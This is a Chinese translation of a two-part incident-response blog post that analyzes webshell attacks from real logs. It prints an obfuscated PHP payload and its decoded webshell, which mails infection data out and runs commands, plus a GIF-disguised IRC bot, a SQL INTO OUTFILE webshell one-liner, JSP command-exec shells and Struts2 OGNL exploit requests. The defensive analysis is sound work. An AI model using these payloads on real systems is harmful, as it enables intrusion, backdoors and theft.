# Webshell-Part1&Part2

**原文链接：**  
[https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/](https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/)  
[https://dfir.it/blog/2016/01/18/webshells-every-time-the-same-story-dot-dot-dot-part2/](https://dfir.it/blog/2016/01/18/webshells-every-time-the-same-story-dot-dot-dot-part2/)

0x00 前言
=======

* * *

众所周知，每时每刻，世界上的web服务器都在遭到成千上万次恶意请求的攻击，攻击形式也是各有不同。今天，我研究的就是其中的一类：webshell。

由于互联网特性的影响，这种类型的攻击活动真的越来越普遍。数百亿的web服务器都有可能沦为攻击者的攻击对象。假如你是一名黑客并且明白web服务器对于企业的意义，我相信，你更不会放过这些服务器的。

0x01 简介-测试开始前
=============

* * *

经过多年的发展，互联网有了翻天覆地的变化。web服务器的功能不再局限于简单的呈现个人网站或商业网站。像JavaScript，PHP，Python和Ruby这样的开发语言已经在商业应用，在线商城，网上娱乐，博客等应用方式中扮演了极为重要的角色。由于这些应用方式更多的会使用现成的解决方案，所以也导致了大量的漏洞。谁没有听说过Wordpress或phpBB漏洞利用呢？这类常用的web应用已经成为了攻击者创建僵尸网络或传播木马的主要目标。当出现新的0-day漏洞时，攻击者就会利用这些漏洞，大规模的入侵受害者的机器。他们首先会做的是通过批量扫描来查找漏洞。有些攻击者则会瞄准web服务器，因为web服务器可以说是进入一些内部基础设施的大门。

0x02 第一幕
========

* * *

我会通过三个例子来说明如何绕过安全措施，成功把webshell上传到目标系统上-包括RFI（远程文件包含漏洞）和SQL命令注入。

### 在常用的文件格式中隐藏webshell代码

下面这个日志尝试利用RFI漏洞来执行代码。

```
Path:
GET /B=1&From=remotelogi‌n.php&L=hebrew&Last‌Check=http://sxxxxxxo.no/byroe.jpg??
Source IP: 185.X.X.53
GEO: MADRID ES , Onestic_Innovacion_y_Desarrollo_SL , singularcomputer.es

```

许多黑客会通过在（恶意）URL中添加`？`来发送RFI漏洞脚本和攻击载荷，这样做是为了避免开发者提供的字符串会造成问题。这种在URL中添加字符的做法与SQL注入很相似，只是SQL注入是在有效载荷的末尾添加注释说明符（`--, ;-- 或 #`）。

攻击者会尝试让web应用从远程服务器中加载一个JPG文件。但是，加载的真的是一个JPG图像吗？请仔细看：

```
0000000: 4749 4638 3961 013f 013f 3f3f 3f3f 3f3f  GIF89a.?.???????
0000010: 3f3f 3f21 3f04 013f 3f3f 3f2c 3f3f 3f3f  ???!?..????,????
0000020: 013f 013f 3f44 013f 3b3f 3c3f 0d0a 0d0a  .?.??D.?;?<?....
0000030: 7365 745f 7469 6d65 5f6c 696d 6974 2830  set_time_limit(0
0000040: 293b 200d 0a65 7272 6f72 5f72 6570 6f72  ); ..error_repor
0000050: 7469 6e67 2830 293b 200d 0a0d 0a63 6c61  ting(0); ....cla

```

从上面可以看出，这根本不是图像文件-但是，这个文件中的确包含一个有效的GIF标头。Trustwave写了一篇[博客](https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/)详细的说明了攻击者可以通过哪些方式把恶意代码隐藏到图像文件中。接下来，我们先分析PHP代码的开头部分：

```
GIF89a^A?^A??????????!?^D^A????,????^A?^A??D^A?;?<?

set_time_limit(0);
error_reporting(0);

class pBot
{
var $config = array("server"=>"irc.malink.biz",
                  "port"=>"6667",
                  "pass"=>"on", //senha do server
                  "prefix"=>"MalinK-",
                  "maxrand"=>3,
                  "chan"=>"#maza",
                  "key"=>"on", //senha do canal
                  "modes"=>"+p",
                  "password"=>"on",  //senha do bot
                  "trigger"=>".",
                  "hostauth"=>"Tukang.sapu " // * for any hostname
                  );
var $users = array();
function start()
{
...

```

pBot类定义了一个数组，在这个数组中包含有完整的配置信息。或许，你也注意到了server和port字段，这些字段提供了与CC相关的信息。在我们检查irc.malink.biz之前，我想先调查malink.biz域名。通过Passivetotal服务，我们可以看到这个域名的历史记录和Whois信息。

![p1](http://drops.javaweb.org/uploads/images/c29d60fcaf7384e7ff7dd6045ed58c2ac59aa17b.jpg)

域名信息和所有者数据显示这个域名的主人来自美国？这样的结果符合你对这个可疑域名的预期吗？或许下面的信息能给我们答案...

![p2](http://drops.javaweb.org/uploads/images/e7065a125428759ac259fa3788b4ab406bd35d1c.jpg)

nothingsecure…OK，这就看起来比较符合逻辑了。IRC提供的信息清楚地显示了这个域名的意图：

![p3](http://drops.javaweb.org/uploads/images/732188506487a98e5d441eece170cc6865f15845.jpg)

接下来，我们看看irc.malink.biz。

```
irc.malink.biz.       14384    IN    A    195.30.107.222
irc.malink.biz.       14384    IN    A    109.74.203.175
irc.malink.biz.       14384    IN    A    167.114.67.197
irc.malink.biz.       14384    IN    A    167.114.68.120

```

他们非常关心故障转移；

总的来说，位于巴黎的服务器接收到一条从马德里发来的请求，这条请求要求访问域名sxxxxxxo.no（哥伦布俄亥俄州），并从这个域名上下载一个内嵌了webshell的文件byroe.jpg。在这个文件中，我们发现了一个IRC服务器irc.malink.biz，这个服务器解析到了多个IP上-使用轮询（round-robin）模式来加载剩余的DNS记录（德国，英国，加拿大）。

![p4](http://drops.javaweb.org/uploads/images/36cd37e506fbebf2499d2058b2a0c2122fd503d5.jpg)

看起来像什么？

Virustotal的AV检测率还不错。目前来说，分析的第一步，最好不要向VT上传任何文件。首先从OSINT入手。比如，在上传文件之前，首先检查VT数据库中有没有这个文件的哈希。在分享恶意文件时（注意，VT数据库是公开的）很可能就会引起攻击者的注意，而攻击者就有机会采取应对措施了。

![p5](http://drops.javaweb.org/uploads/images/01d11d421b275a8bd7cb42cf7c0cf9000949bc73.jpg)

![p6](http://drops.javaweb.org/uploads/images/b71186da653d903327dae97c66cc0ec74f9de075.jpg)

攻击者不仅仅会利用图像文件来绕过WAF。

### 使用代码混淆隐藏webshell

攻击者可能会通过编码和压缩恶意代码的方式来隐藏其意图。这种方法可以绕过WAF的过滤器和签名。

下面是另一起EFI攻击：

```
Path: GET /src=http%3A%2F%2Fim‌g.youtube.com.vxxxxxxxd.org%2Fmyluph.php
Source IP: 93.X.X.206
CEO: AMSTERDAM NL , Digital_Residence_B.V. , curhosting.com

```

可疑文件的内容：

```
<?php eval(gzinflate(str_rot13(base64_decode('rUp6Yts2EP68APkPDHhANppV7pZvg3B7zRxsZNvYmeUMA5JAoCTacyORglXF8YL89x0pyS/Ny9KiToDY9/rcw+MdULNZcX5TRpEpxnT1c+N1aodaRH2PVlZIveZ7rucNU8NYKyBfyI1o3XX8Z7+7RrtykqlD5FyhDneCRnpOA/ioHcZ/u+NYfDqZnPunI2KCr7Wa8S9b6rH714XrWvyL8aAwCFG0BAtZIoKWhM8Qa9BDoSuuUHh/rM0kmdKkGUQw/cA483SA0tJPPxERtUn4SoYNZ1+TNMwzppYQ3jvuu/7Z6MSFAKN+Hx897O7QS9IXrIZgcUXTLKVMBzLOhUfBkpOE1koVTMVf//jkcQw0lTXTGyUyCPKc09g9G1rcDaeEsLiOgXuREX7YPPww0xI7FAneVNiwhPfxKZEsU3/oIyEczZVXW45G8QSMSKVc8cE58nVpWDWIsoIrjkA6MPSKDMQVQXlDPzry8oTXUT2ya/vWMMSm9ap6/mcnl0kYC0Foy+iOkSLPT7rZA5bXGw/OJ35/8NkdHp+5lumDiFfFQ3R6aDLqXZy5w4k/Ho0m1rWNnVJtkIpR2Ok81T2R0YLUIsM+Kk80Csg/sG5Nr3eYSdEwYBTOBcJ6xUdZu4GY0RgdIG2XxoKptkaI207W1SWUtkYB91ayf3bnFxSKGA7nWr/ff++63UJHsRuCPDInAUToI4kYHD+fVviy9+oocie0EMtPO4hWa5NmaXTnEv3aeTZfH1MRBT4tJHuEZjqGirXvs/4/r/0hWhMMu9hesXTjthOsnHgg9GZ11A6ucBsOywcBnLAywm3Dxo3X5riQptacUh0TKUzCVIiwV25wNFsrdF8rN269Kp9hUFWIaHD6uXbKxmmYds5QxQRU6QKSIX0vwlJHzIdDi4pbR8s7RXJMKnFd6/ctxzKXyKj2tC6m3KgaB++0IqMqzzjSEhuMqx6935CbG03Kn1dkaPUtOcD6+SRyIlqZBZRyCVf0+AOmz/U+QMRj0MG4+zKhPZEkhFQVgXrG01whtVl2ByttpzDSHGpjmFFrW+vlTsLW+iIOU7ckzuE7/SfMFQUXVIPrTVTbYCmckYmS5LFvKcmUsTuIiCIV+KoiXdD/R2QBN55RqM9vdypktPWjguYsiigvAcsC/pbBFPxYtWFC/RWXOX8ror2Ib1UXxruFNk55xNeEFt7v3pdsOF3oDxiFMZGyo8iWUAGy1OFAregtCt6ianAzdcYurcK52g258YiYXkXp+hrs1QyOyqeEA0H3U25piV4e3qVIRG9dg50xMq2YiFvqF9F25HiD+pMuKlb9wg3WxwqNetKUYH5VKF16MVeqroDlQSM9Gh5DsUjQlt7Lw5BXiRSI7K/Dwfx3nSB8hB7MhXtRZdn3FctjWgxypTKJzMItJ1ua0e4LIx/bZUHj2KdqNKzrVXOwFVrkdV+8NV22nwHJGoIoMawV3wtOfBMGmahn9RKBzwBPH5hiFgxRgAUjbt/YDvzC8wJRRjYzD4xTBdD4er6D0Grgtm+JDm9vPQe9iBgCHLpoow+/CvqRLFZZ5uh2E2bpB8OT0RPqxZwp2h263uAYvZDgRt5pVxga2+/d3Z1pzPgNGrufbr6ejsaT3sUEDW3w2k6ncLffweUzZ7FL2GPx88TOBLQfg7fYAeMRPAUlI/oh62sJQ7+UQVGnBFOsE/h4/Yxa9eTQqWB56f8JgkyBDL92mh+t1orufw==')))); ?>

```

这是一个典型的经过混淆的PHP代码。eval()函数会负责执行这个代码，但是，在此之前，首先需要：

*   解码base64
*   ROT13
*   解压

这里还有另外一种更复杂的版本。想一下，使用与前面相同的函数，但是使用多层混淆代码。要想获取到原始代码，需要不断地解码，这样的话，PHP解释器就不好用了。为了避免你遇到这种情况，我建议你使用phpdecoder。

下面是去混淆后的代码：

```
error_reporting(0);
if (!isset($_SESSION['bajak']))    {
$visitcount = 0;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$body = "ada yang inject \n$web$inj";
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE = OFF";}
else {$security= "SAFE_MODE = ON";};
$serper=gethostbyname($_SERVER['SERVER_ADDR']);
$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
mail("setoran404@gmail.com", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
$_SESSION['bajak'] = 0;
}
else {$_SESSION['bajak']++;};
if(isset($_GET['clone'])){
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/wp-pomo.php";
rename($source, $desti);
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE : OFF";}
else {$security= "SAFE_MODE : ON";}
echo "<title>bogel - exploit</title><br>";
echo "<font size=3 color=#FFF5EE>Ketika Sahabat Jadi Bangsat !<br>";
echo "<font size=3 color=#FFF5EE>Server : irc.blackunix.us 7000<br>";
echo "<font size=3 color=#FFF5EE>Status : sCanneR ON<br><br>";
echo "<font size=2 color=#FF0000><b>".$security."</b><br>";
$cur_user="(".get_current_user().")";
echo "<font size=2 color=#FF0000><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=#FF0000><b>Uname : ".php_uname()."</b><br>";
function pwd() {
$cwd = getcwd();
if($u=strrpos($cwd,'/')){
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\')){
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
echo '<form method="POST" action=""><font size=2 color=#FF0000><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="eXcute"></form>';
echo '<form enctype="multipart/form-data" action method=POST><font size=2 color=#FF0000><b>Upload File</b></font><br><input type=hidden name="submit"><input type=file name="userfile" size=28><br><font size=2 color=#FF0000><b>New name: </b></font><input type=text size=15 name="newname" class=ta><input type=submit class="bt" value="Upload"></form>';
if(isset($_POST['submit'])){
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){
echo "Upload Failed";
} else { echo "Upload Success to ".$uploaddir.$name." :D "; }
}
if(isset($_POST['command'])){
$cmd = $_POST['cmd'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($cmd)."</font></pre>";
}
elseif(isset($_GET['cmd'])){
$comd = $_GET['cmd'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($comd)."</font></pre>";
}
elseif(isset($_GET['smtp'])){
$smtp = file_get_contents("../../wp-config.php");
echo $smtp;
}
else { echo "<pre><font size=3 color=#FFF5EE>".shell_exec('ls -la')."</font></pre>"; }
echo "<center><font size=4 color=#FFF5EE>Jayalah <font size=4 color=#FF0000>INDO<font size=4 color=white>NESIA <font size=4 color=#FFF5EE>Ku</center>";
?>
<link REL="SHORTCUT ICON" HREF="http://www.forum.romanisti-indonesia.com/Smileys/default/b_indonesia.gif"></link><body bgcolor="#000000"></body>

```

第一部分代码正在负责向[setoran404@gmail.com](mailto:setoran404@gmail.com)发送与感染活动相关的确认邮件。随后的这段代码会负责在被感染系统上执行命令，并打印页面上的输出。下面是从网络上找到的“生成”样本：

![p7](http://drops.javaweb.org/uploads/images/06569a538a20f56dafa3e90356146a3302946310.jpg)

你可以看到，攻击者上传了几个“插件”，比如Mailer-1.php，Mailer-2.php，1337w0rm.php

我又看了看VirusTotal的AV检测率：

![p8](http://drops.javaweb.org/uploads/images/d0f7df561a6ff8ef4c60aa9130e0eb33faf19498.jpg)

![p9](http://drops.javaweb.org/uploads/images/21883fb183df1db4a8034e8bb6ccc549c9b51ea4.jpg)

这次不好，大部分AV引擎都无法识别出这个可疑文件。

### 使用SQL注入投放webshell

仔细观察下面的例子：

```
UNION SELECT NULL,"<? system($_REQUEST['cmd']); ?>", NULL INTO OUTFILE "/var/www/webshell.php" --

```

首先，攻击者需要一个SQL注入漏洞。接下来，专门设计一个请求来注入服务器上保存的PHP代码。

解释：

```
<? system($_REQUEST['cmd']); ?>

```

这是一个很简单的webshell，其作用是执行web服务器上的命令。取决于不同的SQL注入漏洞，攻击者需要把漏洞放置到合适的位置。在这个例子中，表中有三栏，代码需要放在第二栏中，其他的都设置成NULL。

```
INTO OUTFILE

```

这条SQL命令允许攻击者把webshell代码写入任意文件中。

```
"/var/www/webshell.php"

```

这是webshell的保存路径。很重要的一点是，攻击者需要在服务器上找到具有写入权限的目录，比如，临时文件夹。除此之外，攻击者还需要想办法强制应用执行这个webshell脚本。在这个例子中，可以通过LFI来实现。下面的案例就包括了所有上述的依赖项。

在执行了SQL查询后，webshell文件就会被创建。现在，攻击者就可以与webshell交互了，通过简单的发送一个HTTP GET请求并定义下面的URL：

```
http://www.vulnerablesite.com/webshell.php?cmd=ls

```

服务器会返回`/var/www`的目录列表。

![p10](http://drops.javaweb.org/uploads/images/1a5bac22b312cf182717bec23746076644500942.jpg)

最后，看看VirusTotal怎么查找这个只有一行的wenshell。

![p11](http://drops.javaweb.org/uploads/images/33cabfc93ab9e5eb2ea62d208e2a745398c5d383.jpg)

很好的隐藏了；

如果你还想再了解一些知识，可以阅读[greensql上的文章](http://www.greensql.com/article/protect-yourself-sqli-attacks-create-backdoor-web-server-using-mysql)，或看看[Youtube上的视频](https://www.youtube.com/watch?v=lcaqam-CyBE)。

通过上面的三个例子，我们只是简单了解了webshell相关的内容。要想在远程服务器上执行任意代码，并与OS交互，还有其他很多可以利用的方式。在下一部分中，我会通过一个例子来说明webshell对于企业基础设施有多么大的危害，并介绍相关的防御方法。

0x03 第二幕-前言
===========

* * *

我们已经说过，每时每刻，世界上大量的黑客正在试图利用各种漏洞。攻击者会通过不同的混淆方式或隐匿技术来投放有效载荷，并通过安装webshell来抢占第一据点。不过，对于防御者而言，还有更大的难题，因为有些目的明确的攻击者会执行网络间谍活动，但是他们的行动更难发现，并且更有针对性。

0x04 第二幕
========

* * *

下面的这个案例分析引发了我们对基础安全控制，风险和各方责任的广泛讨论。你们当中有很多人可能都经历过漏洞攻击，系统篡改等问题。先把这些问题放到一边，今天，我们讨论的主题是-针对性攻击中的webshell使用。

在调查过程中，最关键的一部分就是找到攻击者的切入点。有一次，运维小组报告了一起影响了大量web服务器的事件，在这次攻击中，我发现攻击者综合利用了自定义后门，rootkit和密码转储工具（注意：没有在本文中讨论）。

![p12](http://drops.javaweb.org/uploads/images/d0742c065f1614acc12aeeb9ee6d16392576af6c.jpg)

通过分析多台机器上遗留下来的木马工具和感染活动发生的时间，我们找到了安装了第一个木马样本的可疑服务器。唯一的问题是，这个人是怎么在内部web服务器上植入第一个恶意文件的呢？事实上，这个木马是用一个应用服务器的服务账户执行的，坏消息是这个账户还有管理员权限。

### 我们从哪里入手

我从来没有为执法部门工作过，我也不知道当时有什么人能够收集到必须的信息。或许，通过审讯手段能够做到。无论如何，要想调查成功，你需要获取大量的信息，以便对系统，基础设施，商业过程有全面的了解。通过分析可用的数据，能够证实信息的真实性。但是，当你知道服务器中存在着数十个商业应用，上千条代码时，你又该从何入手呢？这时，你需要根据应用的功能，可用性和暴漏程度来考虑对各个应用的重视程度。

在讨论应用的功能时，一名OPS成员使用了Magic word来触发警报：

*   “这个服务器上的应用支持内网用户，并且只能在内部网络中使用。”
*   “只有在内网中才能访问这些应用。”
*   “不在这个服务器上。”
*   “这个服务器？那么其他服务器呢？”
*   “某些应用是从中心内部存储中挂载的，可以是内部存储，也可以是DMZ服务器。”

我们要分析一些应用日志吗？

Tomcat应用服务器在作为windows服务安装时，会把来自web应用的信息记录到stdout.log。和大多数标准的输出日志一样，你可以从应用转储中看到大量的活动痕迹。但是，在研究了无数的Java信息后，下面这条引起了我的注意：

```
org.apache.jasper.JasperException: 在处理 JSP页面时出现了错误 /images/abc.jsp at line 5

2: <%
3: try {
4: String cmd = request.getParameter("cmd");
5: Process child = Runtime.getRuntime().exec(cmd);

```

在快速研究了这些错误后，我又发现了另外一些有趣的文件：

```
org.apache.jasper.JasperException: 无法编译JSP 
JSP文件的第一行发生了一个错误: /images/test/bb.jsp
左边必须是一个变量 
<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+"\\images\\test\\".write(request.getParameter("t").getBytes());%>

```

如果第一个错误信息还不够有说服力，后面的错误信息显示有人在尝试写入一个文件，这个文件似乎是一个非常小，但是非常强大的webshell。这时候我们可以看看这个文件到底有什么用：

```
try {
String cmd = request.getParameter("cmd");
Process child = Runtime.getRuntime().exec(cmd);
InputStream in = child.getInputStream();
int c;
while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close();

```

这个简单的服务器端程序会通过cmd参数接收一条命令，尝试在系统上执行这条命令，并返回命令输出。如果你想要控制受害者的设备，你就离不开这个程序。

“让我猜一猜”，我的一名朋友在处理数据和问题时经常会说这句话。我也经常这样问我自己，但是，当时没有人能回答这个问题。应用日志表明有人在中央存储中投放了webshell，但是，我们还不清楚是怎样做到的。不幸的是，遗留下来的日志并不完整，还有一些日志丢失了。幸运的是，我知道是哪个应用把webshell保存在了这个目录中，所以我可以专注于特定的web应用流量。我们要不要分析一些web服务器日志呢？

在浏览整个日志时，下面的项目引起了我的注意。似乎这个应用被强制执行了系统命令来查看网络配置：

```
GET <AppURL>redirectAction:%25{
  (new+java.io.BufferReader(new+java.io.InputStreamReader((new+java.lang.ProcessBuilder(new+java.lang.String[]{‘ipconfig’}.start()).getInputStream())))).readline()}

```

在查找所有redirectAction实例的日志时，我们发现了另外的一些数据：

```
ET <AppURL>redirectAction:%25
{(new+java.io.BufferedWriter(new+java.io.FileWriter(new+java.io.File(“1.jsp”)).append(req.getParameter(“e”)).close()}&e=<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+"\\images\\test\\")).write(request.getParameter("t").getBytes());%>

```

这个日志显示，正在尝试将前面提到的webshell写入共享应用文件夹中。通过谷歌搜索和测试，我们发现这个HTTP请求会尝试利用一个已知的Struts 2 漏洞CVE-2013-2135。通过这起活动的时间戳再结合分析服务器上木马工具的时间戳，我们找到了第一个入侵点。

一张图能说明很多问题：

![p13](http://drops.javaweb.org/uploads/images/a79c082eb85b0b8e474352447f7ea60090cfda04.jpg)

0x05 总结
=======

* * *

这个故事的寓意很简单。那些思维缜密的攻击者经常会在攻击活动的不同阶段来利用webshell这个武器，无论是刚开始入侵受害者的设备，还是要维持木马的存在。更重要的是，防御者和事件响应人员并不是随时都有分析数据。访问日志可能已经被覆盖了，但是每次攻击都会在系统上遗留一些工具。应用日志中都会记录下这些信息，而且人都会犯错的。

Mandiant[记录了](https://www.fireeye.com/blog/threat-research/2013/08/responding-attacks-apache-struts2.html)几个月前利用Struts2漏洞实施的webshell攻击活动。CrowdStrike分享了一篇关于HURRICANE PANDA 和 DEEP PANDA的[文章](http://www.crowdstrike.com/blog/adversary-tricks-crowdstrike-treats/)，这两次行动利用了China Chopper webshell。这些文章都很值得一读。